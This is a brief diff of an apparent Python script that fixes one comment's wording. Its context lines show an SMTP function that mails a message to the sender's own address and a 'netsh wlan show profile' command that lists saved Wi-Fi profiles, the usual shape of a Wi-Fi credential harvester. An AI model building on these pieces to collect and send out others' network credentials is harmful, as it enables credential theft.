@@ -12,7 +12,7 @@ def send_mail(email, password, message):
     server.login(email, password)
     server.sendmail(email, email, message)
     server.quit()
-# This function starts an smtp server in order to send a mail for yourself
+# This function starts an smtp server in order to send a mail to yourself
 
 
 command = "netsh wlan show profile"
